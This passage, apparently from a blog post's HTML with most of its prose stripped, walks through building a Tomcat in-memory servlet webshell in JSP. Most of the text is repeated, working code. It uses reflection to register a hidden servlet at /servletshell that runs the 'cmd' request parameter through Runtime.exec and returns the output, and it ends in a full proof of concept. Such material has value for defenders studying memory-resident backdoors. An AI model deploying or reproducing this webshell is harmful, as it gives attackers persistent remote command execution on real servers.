resp);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">%&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;%</span><br><span class=\"line\">    <span class=\"comment\">//context</span></span><br><span class=\"line\">    ServletContext servletContext = request.<span class=\"title function_ invoke__\">getSession</span>().<span class=\"title function_ invoke__\">getServletContext</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">    Field appctx = servletContext.<span class=\"title function_ invoke__\">getClass</span>().<span class=\"title function_ invoke__\">getDeclaredField</span>(<span class=\"string\">&quot;context&quot;</span>);</span><br><span class=\"line\">    appctx.<span class=\"title function_ invoke__\">setAccessible</span>(<span class=\"literal\">true</span>);</span><br><span class=\"line\">    ApplicationContext applicationContext = (ApplicationContext) appctx.<span class=\"title function_ invoke__\">get</span>(servletContext);</span><br><span class=\"line\"></span><br><span class=\"line\">    Field stdctx = applicationContext.<span class=\"title function_ invoke__\">getClass</span>().<span class=\"title function_ invoke__\">getDeclaredField</span>(<span class=\"string\">&quot;context&quot;</span>);</span><br><span class=\"line\">    stdctx.<span class=\"title function_ invoke__\">setAccessible</span>(<span class=\"literal\">true</span>);</span><br><span class=\"line\">    StandardContext standardContext = (StandardContext) stdctx.<span class=\"title function_ invoke__\">get</span>(applicationContext);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//</span></span><br><span class=\"line\">    Field state=Class.<span class=\"title function_ invoke__\">forName</span>(<span class=\"string\">&quot;org.apache.catalina.util.LifecycleBase&quot;</span>).<span class=\"title function_ invoke__\">getDeclaredField</span>(<span class=\"string\">&quot;state&quot;</span>);</span><br><span class=\"line\">    state.<span class=\"title function_ invoke__\">setAccessible</span>(<span class=\"literal\">true</span>);</span><br><span class=\"line\">    state.<span class=\"title function_ invoke__\">set</span>(standardContext,org.apache.catalina.LifecycleState.STARTING_PREP);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//</span></span><br><span class=\"line\">    String servletName=<span class=\"string\">&quot;servletShell&quot;</span>;</span><br><span class=\"line\">    String servletClass=<span class=\"string\">&quot;servletShell.class&quot;</span>;</span><br><span class=\"line\">    Class serletC=Servletshell.<span class=\"keyword\">class</span>;</span><br><span class=\"line\">    Method addServlet=Class.<span class=\"title function_ invoke__\">forName</span>(<span class=\"string\">&quot;org.apache.catalina.core.ApplicationContext&quot;</span>).<span class=\"title function_ invoke__\">getDeclaredMethod</span>(<span class=\"string\">&quot;addServlet&quot;</span>, String.<span class=\"keyword\">class</span>, Class.<span class=\"keyword\">class</span>);</span><br><span class=\"line\">    <span class=\"comment\">//addServlet.setAccessible(true);</span></span><br><span class=\"line\">    addServlet.<span class=\"title function_ invoke__\">invoke</span>(applicationContext,servletName,serletC);</span><br><span class=\"line\">    System.out.<span class=\"title function_ invoke__\">println</span>(standardContext.<span class=\"title function_ invoke__\">findChildren</span>());</span><br><span class=\"line\">%&gt;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>servlet <code>children</code> </p>\n<p> <code>servlet-name</code></p>\n<p> <code>addServletMapping</code> </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;%@ page import=&quot;java.io.ByteArrayOutputStream&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.io.Writer&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.lang.reflect.Method&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;%</span><br><span class=\"line\">    class Servletshell extends HttpServlet &#123;</span><br><span class=\"line\">        @Override</span><br><span class=\"line\">        protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;</span><br><span class=\"line\">            String cmd=req.getParameter(&quot;cmd&quot;);</span><br><span class=\"line\">            if(cmd!=null)&#123;</span><br><span class=\"line\">                InputStream in = Runtime.getRuntime().exec(&quot;cmd /c &quot;+cmd).getInputStream();</span><br><span class=\"line\"></span><br><span class=\"line\">                ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class=\"line\">                byte[] b = new byte[1024];</span><br><span class=\"line\">                int a = -1;</span><br><span class=\"line\"></span><br><span class=\"line\">                while ((a = in.read(b)) != -1) &#123;</span><br><span class=\"line\">                    baos.write(b, 0, a);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                Writer writer=resp.getWriter();</span><br><span class=\"line\">                writer.write(new String(baos.toByteArray()));</span><br><span class=\"line\">                writer.flush();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        @Override</span><br><span class=\"line\">        protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;</span><br><span class=\"line\">            super.doPost(req, resp);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">%&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;%</span><br><span class=\"line\">    //context</span><br><span class=\"line\">    ServletContext servletContext = request.getSession().getServletContext();</span><br><span class=\"line\"></span><br><span class=\"line\">    Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class=\"line\">    appctx.setAccessible(true);</span><br><span class=\"line\">    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);</span><br><span class=\"line\"></span><br><span class=\"line\">    Field stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class=\"line\">    stdctx.setAccessible(true);</span><br><span class=\"line\">    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);</span><br><span class=\"line\"></span><br><span class=\"line\">    //</span><br><span class=\"line\">    Field state=Class.forName(&quot;org.apache.catalina.util.LifecycleBase&quot;).getDeclaredField(&quot;state&quot;);</span><br><span class=\"line\">    state.setAccessible(true);</span><br><span class=\"line\">    state.set(standardContext,org.apache.catalina.LifecycleState.STARTING_PREP);</span><br><span class=\"line\"></span><br><span class=\"line\">    //</span><br><span class=\"line\">    String servletName=&quot;servletShell&quot;;</span><br><span class=\"line\">    String urlpattern=&quot;/servletshell&quot;;</span><br><span class=\"line\">    Class serletC=Servletshell.class;</span><br><span class=\"line\"></span><br><span class=\"line\">    Method addServlet=Class.forName(&quot;org.apache.catalina.core.ApplicationContext&quot;).getDeclaredMethod(&quot;addServlet&quot;, String.class, Class.class);</span><br><span class=\"line\">    addServlet.invoke(applicationContext,servletName,serletC);</span><br><span class=\"line\"></span><br><span class=\"line\">    Method addServletMapping=Class.forName(&quot;org.apache.catalina.core.StandardContext&quot;).getDeclaredMethod(&quot;addServletMapping&quot;, String.class, String.class);</span><br><span class=\"line\">    addServletMapping.invoke(standardContext,urlpattern,servletName);</span><br><span class=\"line\"></span><br><span class=\"line\">    System.out.println(standardContext.findChildren());</span><br><span class=\"line\">%&gt;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>503503</p>\n<p>sb</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if(state!=null)&#123;</span><br><span class=\"line\">        state.set(standardContext,org.apache.catalina.LifecycleState.STARTED);</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p>404</p>\n<p> <code>ApplicationFilterChain#</code>`internalDoFilter <code></code> servlet <code></code> service` </p>\n<p> <code>DefaultServlet</code>  <code>ServletShell</code> servletservlet <code>setServlet</code> </p>\n<p><code>ApplicationFilterFactor#createFilterChain</code></p>\n<p><code>StandardWrapperValv#invoke</code></p>\n<p>servlet <code>wrapper.allocate</code> </p>\n<p> <code>instance</code>  <code>instance</code>  <code>wrapper</code> </p>\n<p> <code>getContainer</code></p>\n<p> <code>setContainer</code> <code>StandardContextValve#invoke</code></p>\n<p>wrapper <code>wrapper</code> <code>request</code> <code>request</code> <code>org.apache.catalina.connector.CoyoteAdapter#service</code></p>\n<p> <code>request</code> <code>postParseRequest</code> </p>\n<p></p>\n<p>map</p>\n<p><code>org.apache.catalina.mappe.Mapper#internalMap</code> <code>contextVersion</code></p>\n<p> <code>contextVersion</code> <code>exactWrappers</code> servlet <code>wrapper</code> servlet404servletwrapperwrapper <code>addWrapper</code> </p>\n<p> <code>contextVersion</code>  <code>wrapper</code></p>\n<p>   <code>contextVersion</code></p>\n<p></p>\n<p> <code>contextObjectToContextVersionMap</code></p>\n<p> <code>contextVersion</code>  <code>contextVersion</code>,<code>contextObjectToContextVersionMap</code> mappermapper</p>\n<p>service <code>getMapper</code>  <code>mapper</code>  <code>StandardService</code> </p>\n<p> <code>ApplicationContext</code>  <code>service</code>  <code>ApplicationContext</code> </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//service</span><br><span class=\"line\">    Field servicef=applicationContext.getClass().getDeclaredField(&quot;service&quot;);</span><br><span class=\"line\">    servicef.setAccessible(true);</span><br><span class=\"line\">    StandardService service=(StandardService) servicef.get(applicationContext);</span><br><span class=\"line\"></span><br><span class=\"line\">    //mapper</span><br><span class=\"line\">    Mapper mapper=service.getMapper();</span><br><span class=\"line\"></span><br><span class=\"line\">    //contextVersion</span><br><span class=\"line\">    Field contextObjectToContextVersionMapf=mapper.getClass().getDeclaredField(&quot;contextObjectToContextVersionMap&quot;);</span><br><span class=\"line\">    contextObjectToContextVersionMapf.setAccessible(true);</span><br><span class=\"line\">    ConcurrentHashMap contextObjectToContextVersionMap=(ConcurrentHashMap) contextObjectToContextVersionMapf.get(mapper);</span><br><span class=\"line\">    Object contextVersion=contextObjectToContextVersionMap.get(standardContext);</span><br><span class=\"line\"></span><br><span class=\"line\">    //addWrapper</span><br><span class=\"line\">    Class[] classes=mapper.getClass().getDeclaredClasses();</span><br><span class=\"line\">    Class classt=classes[1];</span><br><span class=\"line\">    Method addWrapper=mapper.getClass().getDeclaredMethod(&quot;addWrapper&quot;, classt, String.class, Wrapper.class, boolean.class, boolean.class);</span><br><span class=\"line\">    addWrapper.setAccessible(true);</span><br><span class=\"line\">    addWrapper.invoke(mapper,contextVersion,&quot;/servletshell&quot;,shellWrapper,false,false);</span><br><span class=\"line\">    System.out.println(&quot;ook&quot;);</span><br></pre></td></tr></table></figure>\n\n<p>   <code>wrapper</code></p>\n<p> <code>StandardContext</code> <code>createWrapper</code>  <code>wrapper</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//wrapper</span><br><span class=\"line\">    StandardWrapper shellWrapper=(StandardWrapper) standardContext.createWrapper();</span><br><span class=\"line\">    shellWrapper.setServlet(shell);</span><br><span class=\"line\">    shellWrapper.setServletClass(shell.getClass().getName());</span><br></pre></td></tr></table></figure>\n\n<p></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;%@ page import=&quot;java.io.ByteArrayOutputStream&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.io.Writer&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.lang.reflect.Method&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.core.StandardWrapper&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.core.StandardService&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.mapper.Mapper&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.Wrapper&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.util.concurrent.ConcurrentHashMap&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;%</span><br><span class=\"line\">    class Servletshell extends HttpServlet &#123;</span><br><span class=\"line\">        @Override</span><br><span class=\"line\">        protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;</span><br><span class=\"line\">            String cmd=req.getParameter(&quot;cmd&quot;);</span><br><span class=\"line\">            if(cmd!=null)&#123;</span><br><span class=\"line\">                InputStream in = Runtime.getRuntime().exec(&quot;cmd /c &quot;+cmd).getInputStream();</span><br><span class=\"line\"></span><br><span class=\"line\">                ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class=\"line\">                byte[] b = new byte[1024];</span><br><span class=\"line\">                int a = -1;</span><br><span class=\"line\"></span><br><span class=\"line\">                while ((a = in.read(b)) != -1) &#123;</span><br><span class=\"line\">                    baos.write(b, 0, a);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                Writer writer=resp.getWriter();</span><br><span class=\"line\">                writer.write(new String(baos.toByteArray()));</span><br><span class=\"line\">                writer.flush();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        @Override</span><br><span class=\"line\">        protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;</span><br><span class=\"line\">            super.doPost(req, resp);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">%&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;%</span><br><span class=\"line\">    //context</span><br><span class=\"line\">    ServletContext servletContext = request.getSession().getServletContext();</span><br><span class=\"line\"></span><br><span class=\"line\">    Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class=\"line\">    appctx.setAccessible(true);</span><br><span class=\"line\">    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);</span><br><span class=\"line\"></span><br><span class=\"line\">    Field stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class=\"line\">    stdctx.setAccessible(true);</span><br><span class=\"line\">    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);</span><br><span class=\"line\"></span><br><span class=\"line\">    //</span><br><span class=\"line\">    Field state=Class.forName(&quot;org.apache.catalina.util.LifecycleBase&quot;).getDeclaredField(&quot;state&quot;);</span><br><span class=\"line\">    state.setAccessible(true);</span><br><span class=\"line\">    state.set(standardContext,org.apache.catalina.LifecycleState.STARTING_PREP);</span><br><span class=\"line\"></span><br><span class=\"line\">    //</span><br><span class=\"line\">    String servletName=&quot;ServletShell&quot;;</span><br><span class=\"line\">    String urlpattern=&quot;/servletshell&quot;;</span><br><span class=\"line\">    Class serletC=Servletshell.class;</span><br><span class=\"line\"></span><br><span class=\"line\">    Method addServlet=Class.forName(&quot;org.apache.catalina.core.ApplicationContext&quot;).getDeclaredMethod(&quot;addServlet&quot;, String.class, Class.class);</span><br><span class=\"line\">    addServlet.invoke(applicationContext,servletName,serletC);</span><br><span class=\"line\"></span><br><span class=\"line\">    Method addServletMapping=Class.forName(&quot;org.apache.catalina.core.StandardContext&quot;).getDeclaredMethod(&quot;addServletMapping&quot;, String.class, String.class);</span><br><span class=\"line\">    addServletMapping.invoke(standardContext,urlpattern,servletName);</span><br><span class=\"line\"></span><br><span class=\"line\">    Servletshell shell=new Servletshell();</span><br><span class=\"line\">    //wrapper</span><br><span class=\"line\">    StandardWrapper shellWrapper=(StandardWrapper) standardContext.createWrapper();</span><br><span class=\"line\">    shellWrapper.setServlet(shell);</span><br><span class=\"line\">    shellWrapper.setServletClass(shell.getClass().getName());</span><br><span class=\"line\">    //shellWrapper.addMapping(&quot;/servletshell&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">    //service</span><br><span class=\"line\">    Field servicef=applicationContext.getClass().getDeclaredField(&quot;service&quot;);</span><br><span class=\"line\">    servicef.setAccessible(true);</span><br><span class=\"line\">    StandardService service=(StandardService) servicef.get(applicationContext);</span><br><span class=\"line\"></span><br><span class=\"line\">    //mapper</span><br><span class=\"line\">    Mapper mapper=service.getMapper();</span><br><span class=\"line\"></span><br><span class=\"line\">    //contextVersion</span><br><span class=\"line\">    Field contextObjectToContextVersionMapf=mapper.getClass().getDeclaredField(&quot;contextObjectToContextVersionMap&quot;);</span><br><span class=\"line\">    contextObjectToContextVersionMapf.setAccessible(true);</span><br><span class=\"line\">    ConcurrentHashMap contextObjectToContextVersionMap=(ConcurrentHashMap) contextObjectToContextVersionMapf.get(mapper);</span><br><span class=\"line\">    Object contextVersion=contextObjectToContextVersionMap.get(standardContext);</span><br><span class=\"line\"></span><br><span class=\"line\">    //addWrapper</span><br><span class=\"line\">    Class[] classes=mapper.getClass().getDeclaredClasses();</span><br><span class=\"line\">    Class classt=classes[1];</span><br><span class=\"line\">    Method addWrapper=mapper.getClass().getDeclaredMethod(&quot;addWrapper&quot;, classt, String.class, Wrapper.class, boolean.class, boolean.class);</span><br><span class=\"line\">    addWrapper.setAccessible(true);</span><br><span class=\"line\">    addWrapper.invoke(mapper,contextVersion,&quot;/servletshell&quot;,shellWrapper,false,false);</span><br><span class=\"line\">    System.out.println(&quot;ook&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">    if(state!=null)&#123;</span><br><span class=\"line\">        state.set(standardContext,org.apache.catalina.LifecycleState.STARTED);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">%&gt;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>500wrapper</p>\n<p>wrapperwrapper <code>parent</code> </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shellWrapper.setParent(standardContext);</span><br></pre></td></tr></table></figure>\n\n<p>poc</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;%@ page import=&quot;java.io.ByteArrayOutputStream&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.io.Writer&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.lang.reflect.Method&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.core.StandardWrapper&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.core.StandardService&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.mapper.Mapper&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.Wrapper&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.util.concurrent.ConcurrentHashMap&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;%</span><br><span class=\"line\">    class Servletshell extends HttpServlet &#123;</span><br><span class=\"line\">        @Override</span><br><span class=\"line\">        protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;</span><br><span class=\"line\">            String cmd=req.getParameter(&quot;cmd&quot;);</span><br><span class=\"line\">            if(cmd!=null)&#123;</span><br><span class=\"line\">                InputStream in = Runtime.getRuntime().exec(&quot;cmd /c &quot;+cmd).getInputStream();</span><br><span class=\"line\"></span><br><span class=\"line\">                ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class=\"line\">                byte[] b = new byte[1024];</span><br><span class=\"line\">                int a = -1;</span><br><span class=\"line\"></span><br><span class=\"line\">                while ((a = in.read(b)) != -1) &#123;</span><br><span class=\"line\">                    baos.write(b, 0, a);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                Writer writer=resp.getWriter();</span><br><span class=\"line\">                writer.write(new String(baos.toByteArray()));</span><br><span class=\"line\">                writer.flush();</span><br><span class=\"line\">            